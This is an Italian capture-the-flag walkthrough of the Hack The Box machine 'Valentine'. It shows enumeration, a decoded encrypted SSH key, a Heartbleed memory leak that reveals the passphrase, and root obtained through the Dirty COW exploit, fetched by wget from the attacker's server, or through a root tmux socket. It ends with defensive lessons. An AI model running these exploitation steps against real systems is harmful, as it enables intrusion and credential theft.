**Author: Noto La Diega Alessandro**

**TARGET 10.10.10.79**

# INFORMATION GATHERING

Iniziamo con un semplice scan [[Nmap]]:
```bash
┌──(root㉿kali)-[/home/kali/htb/valentine]
└─# nmap -sC -sV -O 10.10.10.79    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-16 09:12 EDT
Nmap scan report for 10.10.10.79
Host is up (0.042s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 964c51423cba2249204d3eec90ccfd0e (DSA)
|   2048 46bf1fcc924f1da042b3d216a8583133 (RSA)
|_  256 e62b2519cb7e54cb0ab9ac1698c67da9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_ssl-date: 2023-05-16T13:14:22+00:00; +1m20s from scanner time.
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_http-title: Site doesn't have a title (text/html).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=5/16%OT=22%CT=1%CU=37085%PV=Y%DS=2%DC=I%G=Y%TM=6463815
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=2%ISR=107%TI=Z%CI=Z%II=I%TS=8)OPS
OS:(O1=M53CST11NW4%O2=M53CST11NW4%O3=M53CNNT11NW4%O4=M53CST11NW4%O5=M53CST1
OS:1NW4%O6=M53CST11)WIN(W1=3890%W2=3890%W3=3890%W4=3890%W5=3890%W6=3890)ECN
OS:(R=Y%DF=Y%T=40%W=3908%O=M53CNNSNW4%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=3890%S=O%A=S+%F=AS%O=M53CST11NW4%RD=
OS:0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=
OS:Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%R
OS:IPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 1m19s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.66 seconds
 ```                                                             


Troviamo 3 porte aperte

[[Port 22 SSH |22]]/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
[[Port 80,443 Web |80]]/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
[[Port 80,443 Web |443]]/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))

# ENUMERATION

Cerchiamo con searchsploit:
```bash
┌──(root㉿kali)-[/home/kali/htb/valentine]
└─# searchsploit OpenSSH 5.9p1                   
------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                    |  Path
------------------------------------------------------------------ ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                          | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                    | linux/remote/45210.py
OpenSSH < 6.6 SFTP (x64) - Command Execution                      | linux_x86-64/remote/45000.c
OpenSSH < 6.6 SFTP - Command Execution                            | linux/remote/45001.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix  | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading          | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                              | linux/remote/45939.py
------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
Papers: No Results

┌──(root㉿kali)-[/home/kali/htb/valentine]
└─# searchsploit Apache httpd 2.2.22 
Exploits: No Results
Shellcodes: No Results
Papers: No Results
```

Potrebbero tornaci utili più avanti

Continiuamo l'enumerazione con [[Gobuster]]
```bash
┌──(root㉿kali)-[/home/kali/htb/valentine]
└─# gobuster dir -u http://10.10.10.79 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt     
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.79
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/05/16 09:19:24 Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 38]
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.79/dev/]
/encode               (Status: 200) [Size: 554]
/decode               (Status: 200) [Size: 552]
Progress: 32083 / 81644 (39.30%)
/omg                  (Status: 200) [Size: 153356]
Progress: 39371 / 81644 (48.22%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/05/16 09:22:45 Finished
===============================================================
```

Abbiamo nella cartella /dev due file 
hype_key
note.txt

all'interno di /dev/note.txt
```txt
To do:

1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don't use the decoder/encoder until any of this is done.
6) Find a better way to take notes.
```

all'interno del file hype_key sembra esserci una chiave decodificata in esamdecimale
possiamo decodificarla tramite questo sito:https://conv.darkbyte.ru

oppure tramite il comando `xxd -r -p`

```bash
┌──(root㉿kali)-[/home/kali/htb/valentine]
└─# cat hype_key | xxd -r -p
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY----- 
```


L'output è una chiave RSA crittografata. 
Una chiave RSA è una chiave privata basata sull'algoritmo RSA. 
Una chiave privata viene utilizzata per l'autenticazione e uno scambio di chiavi
simmetriche durante la creazione di una sessione SSL/TLS.

Proviamo ad utilizzarla ma ci viene richiesta una password che ancora non abbiamo
```bash
┌──(root㉿kali)-[/home/kali/htb/valentine]
└─# ssh -i hype_key_encrypted hype@10.10.10.79
Enter passphrase for key 'hype_key_encrypted': 
```

Ci chiede una passphrase che al momento non abbiamo.
Dobbiamo fare più enumerazione

Lanciamo uno scan delle vulnerabilità note con nmap per vedere se troviamo qualcosa:

```bash
┌──(root㉿kali)-[/home/kali/htb/valentine]
└─# nmap --script vuln -oA vuln-scan 10.10.10.79 -p 443                                                  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 06:40 EDT
Nmap scan report for 10.10.10.79
Host is up (0.12s latency).

PORT    STATE SERVICE
443/tcp open  https
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  BID:70574  CVE:CVE-2014-3566
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://www.securityfocus.com/bid/70574
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
```

Abbiamo un indizio **HEARTBLEED**

La vulnerabilità è stata introdotta in seguito all’implementazione dell’estensione Heartbeat per alcuni protocolli usati da OpenSSL. 
Hearbeat evita di dover rinegoziare ogni volta la connessione sicura tra client e server,
mantenendo vivi i collegamenti grazie a richieste effettuate a intervalli regolari;
in particolare il client invia una stringa al server e quest’ultimo la spedisce come risposta al client stesso.

Il bug consente a un utente malintenzionato di leggere fino a 64 KB di memoria dal sistema vulnerabile, con la possibilità di compromettere le chiavi segrete utilizzate per identificare i fornitori dei servizi e per crittografare il traffico, i nomi e le password degli utenti. Ciò consente agli aggressori di spiare le comunicazioni, di impersonare o rubare i dati direttamente dai servizi e dagli utenti.
Un attacco che sfrutta questa falla non lascia traccia e può essere portato a termine senza l’utilizzo di credenziali né, di particolari privilegi.

A questo indirizzo troviamo lo script 
https://gist.github.com/eelsivart/10174134#file-heartbleed-py-L8

Una volata lanciato lo script,riusciamo ad estrapolare questi dati dal server
```bash
┌──(root㉿kali)-[/home/kali/htb/valentine]
└─# python2 heartbleed.py -p 443 -n 10 10.10.10.79 
##################################################################
Connecting to: 10.10.10.79:443, 1 times
Sending Client Hello for TLSv1.0
Received Server Hello for TLSv1.0

WARNING: 10.10.10.79:443 returned more data than it should - server is vulnerable!
Please wait... connection attempt 1 of 1
##################################################################

.@....SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==8....=...P '{..m$C.3
```

Sembra quello che stavamo cercando
Una volta recati al /decode possiamo decifrare l'hash
Your input:

aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==

Your encoded input:

heartbleedbelievethehype 

Possiamo usare openssl per provare a decifrare. 
Chiede una password… usiamo la password  raccolta con heartbleed, 
```bash
root@kali# openssl rsa -in hype_key_encrypted -out hype_key_decrypted
Enter pass phrase for hype_key_encrypted:
writing RSA key
```

>NOTA SSH ( aggiorando il mac BigSur su cui è installa la macchina virtuale ho dovuto aggiungere un file "config" contente le seguenti istruzioni  (https://stackoverflow.com/questions/73795935/sign-and-send-pubkey-no-mutual-signature-supported)
```bash 
┌──(root㉿kali)-[/home/kali]
└─# cat /root/.ssh/config 
Host *
    PubkeyAcceptedKeyTypes=+ssh-rsa
    HostKeyAlgorithms=+ssh-rsa
```

Ci collegiamo tramitte ssh 
```bash
┌──(root㉿kali)-[/home/kali/htb/valentine]
└─# ssh -i hype_key_decrypted hype@10.10.10.79
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Wed May 17 04:21:24 2023 from 10.10.14.53
hype@Valentine:~$ 
```

>NOTA POSSIAMO ANCHE LOGGARCI CON "hype_key_encrypted" BASTA INSERIRE LA PASSWORD TORVATA CON HEARTBLEED AL MOMENTO DEL LOGIN 
```bash
┌──(root㉿kali)-[/home/kali/htb/valentine]
└─# ssh -i hype_key_encrypted hype@10.10.10.79     
Enter passphrase for key 'hype_key_encrypted': 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Wed May 17 03:25:07 2023 from 10.10.14.53
hype@Valentine:~$cat user.txt 
782669829a447d6bc2c84945afb3da3f
```

# PRIVIESC

Scarichiamo sulla macchina target "linux-exploit-suggester-2"
https://github.com/jondonas/linux-exploit-suggester-2

```bash
hype@Valentine:~$ wget http://10.10.14.53:8000/linux-exploit-suggester-2.pl
--2023-05-17 05:07:04--  http://10.10.14.53:8000/linux-exploit-suggester-2.pl
Connecting to 10.10.14.53:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 24292 (24K) [text/x-perl]
Saving to: `linux-exploit-suggester-2.pl'

 0% [                                                                                 ] 0           --.-K/s              
100%[================================================================================>] 24,292      --.-K/s   in 0.1s    

2023-05-17 05:07:05 (171 KB/s) - `linux-exploit-suggester-2.pl' saved [24292/24292]

hype@Valentine:~$ 
hype@Valentine:~$ ls
```

Gli diamo i permessi di esecuzione  e lo eseguimao  
```bash
hype@Valentine:~$ chmod 777 linux-exploit-suggester-2.pl
hype@Valentine:~$ ./linux-exploit-suggester-2.pl 

  #############################
    Linux Exploit Suggester 2
  #############################

  Local Kernel: 3.2.0
  Searching 72 exploits...

  Possible Exploits
  [1] dirty_cow
      CVE-2016-5195
      Source: http://www.exploit-db.com/exploits/40616
  [2] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [3] msr
      CVE-2013-0268
      Source: http://www.exploit-db.com/exploits/27297
  [4] perf_swevent
      CVE-2013-2094
      Source: http://www.exploit-db.com/exploits/26131

#Utiliaziamo searchspolit 
┌──(root㉿kali)-[/home/kali/htb/valentine]
└─# searchsploit dirt cow            
---------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                          |  Path
---------------------------------------------------------------------------------------- ---------------------------------Linux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page (1)                  | linux/dos/43199.c
Linux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page (2)                  | linux/dos/44305.c
Linux Kernel 2.6.22 < 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' Race Condition Privile | linux/local/40616.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalat | linux/local/40847.cpp
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW PTRACE_POKEDATA' Race Condition (Write Access Me | linux/local/40838.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Esca | linux/local/40839.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' /proc/self/mem Race Condition (Write Access Met | linux/local/40611.c
---------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Colpiamo il 40839 e tiriamo su un server per poterlo scaricare sulla macchina target
```bash
┌──(root㉿kali)-[/home/kali/htb/valentine]
└─# searchsploit -m 40839
  Exploit: Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)
      URL: https://www.exploit-db.com/exploits/40839
     Path: /usr/share/exploitdb/exploits/linux/local/40839.c
    Codes: CVE-2016-5195
 Verified: True
File Type: C source, ASCII text
Copied to: /home/kali/htb/valentine/40839.c

┌──(root㉿kali)-[/home/kali/htb/valentine]
└─# python -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

#Lo scarichiamo sulla macchina target,lo compiliamo  e gli diamo i permessi di esecuzione 
hype@Valentine:~$ wget http://10.10.14.53:8000/40839.c     
--2023-05-17 05:20:23--  http://10.10.14.53:8000/40839.c
Connecting to 10.10.14.53:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4814 (4.7K) [text/x-csrc]
Saving to: `40839.c'

100%[================================================================================>] 4,814       --.-K/s   in 0.004s  

2023-05-17 05:20:23 (1.15 MB/s) - `40839.c' saved [4814/4814]

hype@Valentine:~$ ls
40839.c  Documents  LinEnum.sh                    Music     Public     user.txt
Desktop  Downloads  linux-exploit-suggester-2.pl  Pictures  Templates  Videos
hype@Valentine:~$ gcc -pthread 40839.c -o dirty -lcrypt
hype@Valentine:~$ file dirty 
dirty: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x937c2db535a9f60590676e928521f13a7f2280bf, not stripped
hype@Valentine:~$ chmod +x dirty 
```

Possiamo esegurilo (scegliamo una password)
```bash
hype@Valentine:~$ ./dirty 
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
firefart:fiRbwOlRgkx7g:0:0:pwned:/root:/bin/bash

mmap: 7f9a0fa78000


madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password '123'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password '123'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
hype@Valentine:~$ 
hype@Valentine:~$ 
hype@Valentine:~$ su firefart 
Password: 
firefart@Valentine:/home/hype# id
uid=0(firefart) gid=0(root) groups=0(root)
firefart@Valentine:/home/hype#         
```

Possiamo leggere la flag locata in /root 
```bash
firefart@Valentine:~# cat root.txt 
9965fd6b8df7b93fcea180ee1b8f64b2
```

## PRIVESC ALTERNATIVA 

Scaricando LinEPas e esegundolo tra i dati interessanti che troviamo ci sono questi 
```bash
[-] Location and contents (if accessible) of .bash_history file(s):
/home/hype/.bash_history

exit
exot
exit
ls -la
cd /
ls -la
cd .devs
ls -la
tmux -L dev_sess 
tmux a -t dev_sess 
tmux --help
tmux -S /.devs/dev_sess 
exit
pwd
exit
```

Vediamo che c'e una sessione di [[Tmux]] aperte se gira com root possiamo attacarci ad essa con il seguente comando 
```
hype@Valentine:~$ tmux -S /.devs/dev_sess
```

Si aprirà una sessione di tmux con massimi privilegi
```bash

root@Valentine:/home/hype# id
uid=0(root) gid=0(root) groups=0(root)
root@Valentine:/home/hype# 
```

# LESSION LEARNED

Google è il tuo miglior amico, non smettere di cercare mai
Per ottenere un punto d'appoggio iniziale sulla macchina di destinazione abbiamo richiesto due informazioni:
1. la chiave privata 
2.  la passphrase per ssh nell'account di un utente. 
Abbiamo ottenuto la chiave privata enumerando le directory e i file disponibili sul server web.
Per quanto riguarda la passphrase, abbiamo sfruttato il bug Heartbleed nella versione vulnerabile di OpenSSL utilizzata sulla macchina target.
Si sarebbe potuto evitare di ottenere la chiave privata se l'utente non avesse pubblicato le proprie credenziali su un server web pubblico.
Per quanto riguarda la passphrase, questo avrebbe potuto essere evitato se fosse stata installata la versione con patch di OpenSSL.

Per passare ai privilegi di root avevamo due opzioni: 
1. sfruttare la vulnerabilità Dirty COW 
2. collegarci a una sessione tmux di proprietà di root.

Lo sfruttamento di Dirty COW avrebbe potuto essere evitato se la macchina di destinazione fosse stata patchata. 
Per quanto riguarda l'escalation dei privilegi tmux, non sono del tutto sicuro che si tratti di una vulnerabilità. Sembra essere una funzionalità prevista di tmux che consente a qualsiasi utente sulla casella di collegarsi a qualsiasi sessione aperta su quella casella.
Le precauzioni possono essere le seguenti:
1. non eseguendo la sessione tmux come root e utilizzando sudo all'interno della sessione tmux se hai bisogno dei privilegi di root,
2. chiudendo la sessione tmux una volta che hai finito invece di farla funzionare (e accessibile) tutto il tempo.
